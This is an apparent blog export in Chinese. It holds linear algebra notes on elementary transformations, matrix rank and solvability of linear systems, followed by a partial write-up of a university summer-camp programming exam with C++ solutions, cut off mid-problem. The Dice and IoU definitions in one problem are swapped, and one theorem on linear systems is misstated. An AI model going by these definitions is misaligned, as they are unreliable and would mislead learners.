src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_TPKXso31s7.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_DNopoqInVk.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_MzHlnHyXuC.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_eS4oJfCu5b.png"></p><p>取$x_3$为自由未知数，并令$x_3 &#x3D; c$，得到方程组的解如下，其中c为任意常数。</p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_dAiRafIcIT.png"></p><p>矩阵$B_4$和$B_5$都称为行阶梯形矩阵，其特点为：</p><ol><li>可画出一条阶梯线，线的下方全为零；</li><li>每个台阶只有一行，台阶数即为非零行的行数，阶梯线的竖线后面的第一个元素为非零元，即非零行的第一个非零元。</li></ol><p>行阶梯形矩阵$B_5$还称为<strong>行最简形矩阵</strong>，其特点是：</p><ol><li>非零行的第一个非零元为1；</li><li>这些非零元所在列的其余元素均为0。</li></ol><p>对于任何矩阵$A_{m \times n}$，总可经过有限次初等行变换，将其变为行阶梯形和行最简形矩阵。</p><p>注意：行最简形矩阵再经过初等列变换，可变成如下形式：</p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_ct4t_E5tP1.png"></p><p>矩阵F称为矩阵B的标准型，其特点是：</p><ol><li>F的左上角是一个单位矩阵，其余元素全为0</li><li>$m \times n$矩阵A，总可经过初等变换（行变换和列变换），将其化为标准形</li></ol><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image.png"></p><p>此标准型由m，n，r三个数完全决定，其中r是行阶梯形矩阵中非零行的行数。</p><p>所有与A等价的矩阵组成一个集合，标准形F是这个集合中形状最简单的矩阵。</p><h2 id="1-2-初等矩阵"><a href="#1-2-初等矩阵" class="headerlink" title="1.2 初等矩阵"></a>1.2 初等矩阵</h2><p>由<strong>单位矩阵</strong>经过一次初等变换得到的矩阵称为<strong>初等矩阵</strong>。</p><p>三种初等变换对应三种初等矩阵：</p><p>（1）将单位矩阵中的第$i$和$j$两行（列）对调，得初等矩阵</p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_sWh7anT1kd.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_FXmvttdcxL.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_1TbhV2PQrX.png"></p><p>（2）以数$k \neq 0$乘单位阵的第i行（列），得初等矩阵：</p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_gJHMWQT-JX.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_zdQNOHkI0X.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_06_g9I2Pua.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_fARSVXkvsk.png"></p><p>（3）以k乘E的第j列加到第i行上，或以k乘E的第i列加到第j列上，得</p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_5g63xLlCaN.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_Jw62mID8ty.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_dg1wTF9e5h.png"></p><p>归纳上面讨论得如下性质。</p><h3 id="1-2-1-性质1"><a href="#1-2-1-性质1" class="headerlink" title="1.2.1 性质1"></a>1.2.1 性质1</h3><p>设A是一个$m \times n$矩阵，对A实施一次初等行（列）变换，相当于在A的左（右）边乘以相应的m（n）阶初等矩阵。</p><p>由初等矩阵的定义知：初等矩阵都是可逆的，且其逆矩阵也是同一类型的初等矩阵。</p><ol><li>$E(i, j)^{-1}&#x3D;E(i, j)$</li><li>$E(i(k))^{-1}&#x3D;E\left(i\left(\frac{1}{k}\right)\right)$</li><li>$E(i j(k))^{-1}&#x3D;E(i j(-k))$</li></ol><h3 id="1-2-2-性质2"><a href="#1-2-2-性质2" class="headerlink" title="1.2.2 性质2"></a>1.2.2 性质2</h3><p>方阵A可逆的充分必要条件是：存在有限个初等矩阵 $ P_1, P_2,…, P_l $ ，使得</p><p>$$<br>A&#x3D;P_{1} P_{2} \cdots P_{l}<br>$$</p><p><strong>定理</strong>：设A与B是$m \times n$矩阵，则$A \sim B$的充要条件是存在m阶可逆矩阵P及n阶可逆矩阵Q，使得$PAQ&#x3D;B$。</p><p><strong>推论</strong>：方阵A可逆$\ce{&lt;-&gt;}$${A} \stackrel{r}{\sim} {E}$</p><h3 id="1-2-3-利用初等变换求逆矩阵-xD"><a href="#1-2-3-利用初等变换求逆矩阵-xD" class="headerlink" title="1.2.3 利用初等变换求逆矩阵&#xD;"></a>1.2.3 利用初等变换求逆矩阵&#xD;</h3><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_WJZQNCwDir.png"></p><h3 id="1-2-4-利用初等变换求解方程组"><a href="#1-2-4-利用初等变换求解方程组" class="headerlink" title="1.2.4 利用初等变换求解方程组"></a>1.2.4 利用初等变换求解方程组</h3><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_kdEIrpJpay.png"></p><h2 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3 总结"></a>1.3 总结</h2><ol><li>矩阵的初等变换——3种变换</li><li>初等矩阵——3种矩阵</li><li>利用初等变换求逆矩阵</li><li>重要结论——性质、定理、推论</li></ol><hr><h1 id="2-矩阵的秩"><a href="#2-矩阵的秩" class="headerlink" title="2 矩阵的秩"></a>2 矩阵的秩</h1><h2 id="2-1-矩阵秩的概念"><a href="#2-1-矩阵秩的概念" class="headerlink" title="2.1 矩阵秩的概念"></a>2.1 矩阵秩的概念</h2><p>给定一个$m \times n$矩阵A，它的标准型</p><p>$$<br>{F}&#x3D;\left(\begin{array}{cc}E_{r} &amp; {O} \ {O} &amp; {O}\end{array}\right)<br>$$</p><p>是由数r完全确定的，这个数就是A的行阶梯形矩阵中非零行的行数，称这个数是矩阵A的行阶梯形矩阵中非零行的行数，称这个数是矩阵A的<strong>秩</strong>。</p><p>【定义1】在$m \times n$矩阵A中，任取k行与k列，位于这些行列交叉处的$k^2$个元素，不改变它们在A中所处的位置次序，而得的k阶行列式，称为矩阵A的<strong>k阶子式</strong>。</p><p>$m \times n$矩阵A的k阶子式共有$C_{m}^{k} · C_{n}^{k}$个。</p><p>【定义2】设在矩阵A中有一个不等于0的r阶子式D，且所有r+1阶子式（若存在）全等于0，那么D称为矩阵A的<strong>最高阶非零子式</strong>。数r称为矩阵A的秩，记作$R(A)$，并规定零矩阵的秩等于0。</p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_0MH155NKbE.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image__BUeNJ3DTm.png"></p><h2 id="2-2-矩阵秩的求法"><a href="#2-2-矩阵秩的求法" class="headerlink" title="2.2 矩阵秩的求法"></a>2.2 矩阵秩的求法</h2><p>由上例可知，对于一般的矩阵，当行数与列数较高时，按定义求秩是很麻烦的。然而对于行阶梯形矩阵，它的秩就等于非零行的行数。因此自然想到用<strong>初等变换将矩阵化为行阶梯形矩阵</strong>。</p><p>【定理】若$A \sim B$，则$R(A)&#x3D;R(B)$</p><p>【推论】若有可逆矩阵P，Q，使$PAQ&#x3D;B$，则$R(A)&#x3D;R(B)$</p><h2 id="2-3-矩阵秩的性质"><a href="#2-3-矩阵秩的性质" class="headerlink" title="2.3 矩阵秩的性质"></a>2.3 矩阵秩的性质</h2><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_WCnjY-qV7Y.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_aB4jNrBdJB.png"></p><h2 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h2><ol><li>矩阵秩的概念</li><li>矩阵秩的求法<ul><li>定义法</li><li>初等变换法</li></ul></li><li>矩阵秩的性质</li></ol><hr><h1 id="3-线性方程组的解"><a href="#3-线性方程组的解" class="headerlink" title="3 线性方程组的解"></a>3 线性方程组的解</h1><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image1.png"></p><h2 id="3-1-线性方程组解的判定条件"><a href="#3-1-线性方程组解的判定条件" class="headerlink" title="3.1 线性方程组解的判定条件"></a>3.1 线性方程组解的判定条件</h2><p>设有n个未知数m个方程的线性方程组</p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_-B2lgR7wg6.png"></p><p>可以写成以向量x为未知元的向量方程：$Ax&#x3D;b$。</p><p>【定理1】n元线性方程组$Ax&#x3D;b$</p><ol><li>无解的充分必要条件是$R(A)&lt;R(A,b)$</li><li>有唯一解的充分必要条件是$R(A)&#x3D;R(A,b)&#x3D;n$</li><li>有无限多解的充分必要条件是$R(A)&#x3D;R(A,b)&lt;n$</li></ol><h2 id="3-2-重要结论"><a href="#3-2-重要结论" class="headerlink" title="3.2 重要结论"></a>3.2 重要结论</h2><p>【定理2】n元齐次线性方程组$Ax&#x3D;0$有非零解的充要条件是$R(A)&lt;n$。</p><p>【定理3】n元线性方程组$Ax&#x3D;b$有非零解的充要条件是$R(A)&#x3D;R(A,b)$。</p><p>定理2和定理3是定理1的特殊情况。</p><p>【定理4】矩阵方程$Ax&#x3D;B$有解的充分必要条件是$R(A)&#x3D;R(A,B)$</p><p>【定理5】设$AB&#x3D;C$，则$R(C)&#x3D;R(A B) \leq \min {R(A), R(B)}$</p><h2 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h2><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_tRz40_iN-9.png"></p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_EQAIcFKxba.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性代数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.23天津大学夏令营初筛机试</title>
      <link href="/2024/06/23/6.23%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%88%9D%E7%AD%9B%E6%9C%BA%E8%AF%95/"/>
      <url>/2024/06/23/6.23%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%88%9D%E7%AD%9B%E6%9C%BA%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<ul><li>题目设置：一共5道题，只有10%~30%的样例。</li><li>考试时间：9:30~11:30，共2h。</li></ul><p><img src="/2024/06/23/6.23%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%88%9D%E7%AD%9B%E6%9C%BA%E8%AF%95/image_CUznoYQyVW.png"></p><hr><h1 id="1-题目A：整数化"><a href="#1-题目A：整数化" class="headerlink" title="1 题目A：整数化"></a>1 题目A：整数化</h1><h2 id="1-1-题目描述"><a href="#1-1-题目描述" class="headerlink" title="1.1 题目描述"></a>1.1 题目描述</h2><p>小Z在处理二维坐标点上的数据，受到性能限制，他希望把所有的点对应到距离它最近的整数点（横纵坐标均为整数）上， 请你帮他完成这个程序。</p><p>如果一个点有多个距离它最近的点，取横纵坐标更小的那个点。如（1, 1.5）将对应到（1, 1）,（-1, -1.5）将对应到（-1, -2）。</p><h2 id="1-2-输入"><a href="#1-2-输入" class="headerlink" title="1.2 输入"></a>1.2 输入</h2><p>多组样例输入，第一-行输入一个整数T表示样例数。</p><p>对于每个样例，包含两个数表示需要整型化的点。</p><h2 id="1-3-输出"><a href="#1-3-输出" class="headerlink" title="1.3 输出"></a>1.3 输出</h2><p>对于每组样例，输出一行包含两个整数的坐标，用空格分割。</p><h2 id="1-4-样例输入"><a href="#1-4-样例输入" class="headerlink" title="1.4 样例输入"></a>1.4 样例输入</h2><blockquote><p>3<br>1 1.5<br>2 3.2<br>-1 -2</p></blockquote><h2 id="1-5-样例输出"><a href="#1-5-样例输出" class="headerlink" title="1.5 样例输出"></a>1.5 样例输出</h2><blockquote><p>1 1<br>2 3<br>-1 -2</p></blockquote><h2 id="1-6-解题思路"><a href="#1-6-解题思路" class="headerlink" title="1.6 解题思路"></a>1.6 解题思路</h2><p>一开始直接使用了取整<code>int()</code>，但是当输入为负数的时候，例如-1.6取整为-1，但是题意要求是-2，所以应该判断一下小数部分和0.5的关系，分类讨论。</p><p>最终这个对于部分数据AC了，但是不知道剩下的数据怎么样。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">double</span> rest = x - (<span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">abs</span>(rest) &lt; <span class="number">0.5</span>) <span class="keyword">return</span> (<span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">abs</span>(rest) == <span class="number">0.5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (x &gt; <span class="number">0</span>) <span class="keyword">return</span> (<span class="type">int</span>)x;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)x + <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)x + (x &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= t; i ++)</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">double</span> x, y; cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">get</span>(x) &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">get</span>(y);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; t) cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="2-题目B：多项评价指标"><a href="#2-题目B：多项评价指标" class="headerlink" title="2 题目B：多项评价指标"></a>2 题目B：多项评价指标</h1><h2 id="2-1-题目描述"><a href="#2-1-题目描述" class="headerlink" title="2.1 题目描述"></a>2.1 题目描述</h2><p>Dice系数和IoU均为衡量两个集合相似度的重要度量，是图像分割领域的最常用的评价指标，小Z希望写一个程序完成两个指标的转化。</p><p>Dice系数计算方式：</p><p>$$<br>Dice &#x3D;\frac{T P}{T P+F P+F N}<br>$$</p><p>IoU计算公式：</p><p>$$<br>I o U&#x3D;\frac{T P+T P}{T P+T P+F P+F N}<br>$$</p><p>二者转化公式：</p><p>$$<br>Dice &#x3D;\frac{2 \times I o U}{I o U+1}<br>$$</p><h2 id="2-2-输入"><a href="#2-2-输入" class="headerlink" title="2.2 输入"></a>2.2 输入</h2><p>多组样例输入，第一行输入一个整数T表示样例数。</p><p>对于每个样例，输入一行，包括度量名称及度量值，中间用空格隔开，其中指标名称只能为”dice”或”iou”，例如”dice 0.45”, “iou 0.80”。</p><p>输入的<code>IoU</code>和<code>Dice</code>均在[0, 1]范围内。</p><h2 id="2-3-输出"><a href="#2-3-输出" class="headerlink" title="2.3 输出"></a>2.3 输出</h2><p>对于每组样例，输出一个数字表示转化为另一种度量的结果，输出四舍五入保留两位小数。</p><h2 id="2-4-样例输入"><a href="#2-4-样例输入" class="headerlink" title="2.4 样例输入"></a>2.4 样例输入</h2><blockquote><p>3<br>dice 0.4<br>iou 0.8<br>dice 0.9</p></blockquote><h2 id="2-5-样例输出"><a href="#2-5-样例输出" class="headerlink" title="2.5 样例输出"></a>2.5 样例输出</h2><blockquote><p>0.25<br>0.89<br>0.82</p></blockquote><h2 id="2-6-解题思路"><a href="#2-6-解题思路" class="headerlink" title="2.6 解题思路"></a>2.6 解题思路</h2><p>这题不需要使用任何算法，根据题目给出的公式直接计算即可，需要转换得到<code>IoU</code>的计算公式，如下：</p><p>$$<br>IoU &#x3D;\frac{Dice }{2-Dice }<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string type;</span><br><span class="line">    <span class="type">double</span> val; cin &gt;&gt; type &gt;&gt; val;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="string">&quot;dice&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">double</span> IoU = val / (<span class="number">2</span> - val);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2lf&quot;</span>, IoU);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">double</span> Dice = <span class="number">2</span> * val / (val + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2lf&quot;</span>, Dice);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= t; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">work</span>();</span><br><span class="line">        <span class="keyword">if</span> (i &lt; t) cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="3-题目C：跳着数数"><a href="#3-题目C：跳着数数" class="headerlink" title="3 题目C：跳着数数"></a>3 题目C：跳着数数</h1><h2 id="3-1-题目描述"><a href="#3-1-题目描述" class="headerlink" title="3.1 题目描述"></a>3.1 题目描述</h2><p>小Z不喜欢0~9中较大的数字，他想知道如果去掉所有包含大数字的数之后[1, n]区间内，还剩多少个数。</p><p>例如，小Z不喜欢三个7，8，9数字，将所有任意位存在这三个数字的数去掉后，[1, 12]中只剩下了[1, 2, 3, 4, 5, 6,10, 11, 12]这9个数。</p><p>注意，9, 19, 190都包含9数字9，在计数时都需要删去。</p><h2 id="3-2-输入"><a href="#3-2-输入" class="headerlink" title="3.2 输入"></a>3.2 输入</h2><p>多组样例输入，第一行输入一个整数T表示样例数。</p><p>对于每个样例，包含两个数字n k，n表示需要在[1, n]内进行统计，k表示小Z不喜欢的数字为[k, 9]。</p><p>其中$n \leq 10^{18}$，$1 \leq k \leq 9$。</p><h2 id="3-3-输出"><a href="#3-3-输出" class="headerlink" title="3.3 输出"></a>3.3 输出</h2><p>对于每组样例，输出一个数字表示删除不喜欢的数后剩余数字的数量。</p><h2 id="3-4-样例输入"><a href="#3-4-样例输入" class="headerlink" title="3.4 样例输入"></a>3.4 样例输入</h2><blockquote><p>2<br>12 7<br>100 5</p></blockquote><h2 id="3-5-样例输出"><a href="#3-5-样例输出" class="headerlink" title="3.5 样例输出"></a>3.5 样例输出</h2><blockquote><p>9<br>25</p></blockquote><h2 id="3-6-解题思路"><a href="#3-6-解题思路" class="headerlink" title="3.6 解题思路"></a>3.6 解题思路</h2><p>看到n的范围比较大，所以要先用long 